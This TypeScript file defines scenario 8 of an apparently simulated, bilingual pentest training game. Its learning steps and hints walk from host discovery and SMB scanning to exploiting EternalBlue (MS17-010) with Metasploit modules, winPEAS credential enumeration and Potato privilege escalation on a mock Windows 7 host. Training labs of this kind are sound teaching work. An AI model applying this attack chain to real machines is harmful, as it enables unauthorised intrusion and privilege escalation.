// ── laboratorios/laboratorio08.ts ───────────────────────────────────────
// Scenario 8 — EternalBlue + cmd.exe (PLAN_WINDOWS W4)
// Windows 7 sin parchear: recon → scan SMB → MS17-010 → sesión de baja
// privilegio → winPEAS → Potato → flag admin en C:\Users\Administrator\flag.txt.
// Comandos cmd.exe jugables de punta a punta (W0–W1 + winPEAS/potato).

import { buildScenario, createFile, createWindowsFileSystem, COMMON_PORTS } from './templates';
import type { Scenario } from '../types';

const scenario08Data = {
  id: 'scenario-08',
  name: 'EternalBlue + cmd.exe',
  tagline: 'Exploit EternalBlue (MS17-010), enumerate with winPEAS and escalate with Potato on Windows 7.',
  taglineEs: 'Explotá EternalBlue (MS17-010), enumerá con winPEAS y escalá con Potato en Windows 7.',
  description: 'EternalBlue against an unpatched Windows 7 host, then post-exploitation from cmd.exe: winPEAS credential enum, Potato privilege escalation and the admin flag.',
  descriptionEs: 'EternalBlue contra un Windows 7 sin parchear y post-explotación desde cmd.exe: winPEAS, escalada con Potato y la flag de administrador.',
  tools: ['arp-scan', 'nmap', 'metasploit', 'mstsc', 'xrdp', 'winpeas'],
  accentColor: '#f87171',
  networkRange: '192.168.60.0/24',
  flags: {
    root: 'ZIL{ETERNALBLUE_POTATO_PWNED}',
  },
  credentials: {
    admin: { user: 'Administrator', pass: 'P@ssw0rd123!' },
  },
  targetMachine: {
    id: 'lab-scenario-08-win7',
    hostname: 'WIN7-LAB',
    mac: '08:00:27:C4:D5:E6',
    os: 'Windows 7 Professional SP1 x64',
    type: 'workstation',
    ports: [
      COMMON_PORTS.smb('Windows 7 Professional 7601 Service Pack 1'),
      COMMON_PORTS.rdp(),
      { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
      { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
    ],
  },
  learningSteps: [
    {
      task: 'Network Discovery',
      taskEs: 'Descubrimiento de red',
      text: 'Scan the lab network to find live hosts. Your target is a Windows machine.',
      textEs: 'Escaneá la red del laboratorio para encontrar hosts activos. Tu objetivo es una máquina Windows.',
      discoveryLevel: 1,
      hints: {
        hint1: { en: 'Check your own IP (ip a): the target is on the same subnet', es: 'Revisá tu propia IP (ip a): el objetivo está en la misma subred' },
        hint2: { en: 'arp-scan 192.168.60.0/24 (or nmap -sn / netdiscover)', es: 'arp-scan 192.168.60.0/24 (o nmap -sn / netdiscover)' },
      },
      validationCriteria: { type: 'discoveredHosts' as const, minHosts: 1 },
    },
    {
      task: 'Port Scan SMB',
      taskEs: 'Escaneo de puertos SMB',
      text: 'Scan the target and identify the SMB service on port 445',
      textEs: 'Escaneá el objetivo e identificá el servicio SMB en el puerto 445',
      discoveryLevel: 2,
      hints: {
        hint1: { en: 'Use nmap against the target IP', es: 'Usá nmap contra la IP del objetivo' },
        hint2: { en: 'nmap -sV -p- <target-ip> — look for 445/tcp microsoft-ds', es: 'nmap -sV -p- <ip-objetivo> — buscá 445/tcp microsoft-ds' },
      },
      validationCriteria: { type: 'scanResults' as const, port: 445 },
    },
    {
      task: 'Verify MS17-010',
      taskEs: 'Verificar MS17-010',
      text: 'Check with Metasploit if the target is vulnerable to MS17-010 (EternalBlue)',
      textEs: 'Verificá con Metasploit si el objetivo es vulnerable a MS17-010 (EternalBlue)',
      discoveryLevel: 2,
      hints: {
        hint1: { en: 'msfconsole → use auxiliary/scanner/smb/smb_ms17_010', es: 'msfconsole → use auxiliary/scanner/smb/smb_ms17_010' },
        hint2: { en: 'set RHOSTS <target-ip> → run', es: 'set RHOSTS <ip-objetivo> → run' },
      },
      validationCriteria: { type: 'vulnerabilityFound' as const, vulnId: 'MS17-010' },
    },
    {
      task: 'Exploit EternalBlue',
      taskEs: 'Explotar EternalBlue',
      text: 'Exploit MS17-010 to open a Meterpreter session on the Windows host',
      textEs: 'Explotá MS17-010 para abrir una sesión Meterpreter en el host Windows',
      discoveryLevel: 3,
      hints: {
        hint1: { en: 'use exploit/windows/smb/ms17_010_eternalblue', es: 'use exploit/windows/smb/ms17_010_eternalblue' },
        hint2: { en: 'set RHOSTS <target-ip> → set LHOST <your-ip> → exploit', es: 'set RHOSTS <ip-objetivo> → set LHOST <tu-ip> → exploit' },
      },
      validationCriteria: { type: 'exploit' as const },
    },
    {
      task: 'Enumerate With winPEAS',
      taskEs: 'Enumerar con winPEAS',
      text: 'From the Windows shell (cmd.exe), run winPEAS to find stored credentials',
      textEs: 'Desde la shell Windows (cmd.exe), corré winPEAS para encontrar credenciales guardadas',
      discoveryLevel: 4,
      hints: {
        hint1: { en: 'After the session, your prompt is C:\\Users\\... — type winpeas', es: 'Tras la sesión, tu prompt es C:\\Users\\... — escribí winpeas' },
        hint2: { en: 'winPEAS reports readable files that contain Username/Password pairs', es: 'winPEAS reporta archivos legibles que contienen pares Username/Password' },
      },
      validationCriteria: { type: 'foundCredentials' as const, user: 'Administrator' },
    },
    {
      task: 'Escalate With Potato',
      taskEs: 'Escalar con Potato',
      text: 'You are a low-privilege user: escalate to administrator with Potato',
      textEs: 'Sos un usuario de baja privilegio: escalá a administrador con Potato',
      discoveryLevel: 4,
      hints: {
        hint1: { en: 'Run potato from the cmd.exe shell', es: 'Corré potato desde la shell cmd.exe' },
        hint2: { en: 'potato steals a SYSTEM service token and elevates your session', es: 'potato roba un token de servicio SYSTEM y eleva tu sesión' },
      },
      validationCriteria: { type: 'privesc' as const },
    },
    {
      task: 'Capture the Admin Flag',
      taskEs: 'Capturar la flag de administrador',
      text: 'Read the admin flag from C:\\Users\\Administrator\\flag.txt (now you have privileges)',
      textEs: 'Leé la flag de administrador desde C:\\Users\\Administrator\\flag.txt (ya tenés privilegios)',
      discoveryLevel: 4,
      hints: {
        hint1: { en: 'type C:\\Users\\Administrator\\flag.txt', es: 'type C:\\Users\\Administrator\\flag.txt' },
        hint2: { en: 'Without Potato the file is 0600 Administrator and type returns access denied', es: 'Sin Potato el archivo es 0600 Administrator y type devuelve acceso denegado' },
      },
      validationCriteria: { type: 'fileRead' as const, fileType: 'flag' as const },
    },
  ],
};

export const scenario_08: Scenario = buildScenario({
  id: scenario08Data.id,
  name: scenario08Data.name,
  description: scenario08Data.descriptionEs,
  difficulty: 'Medium',
  category: 'Network',
  networkRange: scenario08Data.networkRange,
  targetMachine: {
    id: scenario08Data.targetMachine.id,
    machine_info: {
      hostname: scenario08Data.targetMachine.hostname,
      mac: scenario08Data.targetMachine.mac,
      os: scenario08Data.targetMachine.os,
      status: 'up',
      type: scenario08Data.targetMachine.type,
      family: 'windows',
    },
    discovery_level: 0,
    scan_results: { ports: [] },
    ports: scenario08Data.targetMachine.ports,
    win: { currentUser: 'win7user', isAdmin: false, computerName: 'WIN7-LAB' },
    known_passwords: { Administrator: scenario08Data.credentials.admin.pass },
    flags: scenario08Data.flags,
    files: [
      // FS base neutro de Win7 (la plantilla no trae archivos de usuario).
      ...createWindowsFileSystem({ username: 'win7user', computerName: 'WIN7-LAB' }),
      // Nota del usuario de baja privilegio con las credenciales de
      // Administrator: gancho de enumeración (winpeas la escanea). Fuente
      // única de las credenciales: scenario08Data.credentials.admin.
      createFile(
        '/C:/Users/win7user/Documents/notes.txt',
        `TODO:\n- Update server passwords\n- Check firewall rules\n- Review access logs\n\nAdmin credentials:\nUsername: ${scenario08Data.credentials.admin.user}\nPassword: ${scenario08Data.credentials.admin.pass}`,
        'text', 'win7user', 'win7user', 0o600,
      ),
      // Archivo de escritorio: NO es la flag del lab (si lo fuera, win7user
      // la leería sin privesc y completaría la misión prematuramente).
      createFile(
        '/C:/Users/win7user/Desktop/flag.txt',
        'Desktop notes: patch Tuesday can wait.',
        'text', 'win7user', 'win7user', 0o644,
      ),
      // Home del Administrador + flag real (0600: solo admin/root la lee).
      createFile('/C:/Users/Administrator/.dir', '', 'text', 'Administrator', 'Administrators', 0o755),
      createFile(
        '/C:/Users/Administrator/flag.txt',
        scenario08Data.flags.root,
        'text', 'Administrator', 'Administrators', 0o600,
      ),
    ],
  },
  learningSteps: scenario08Data.learningSteps,
});

export { scenario08Data };
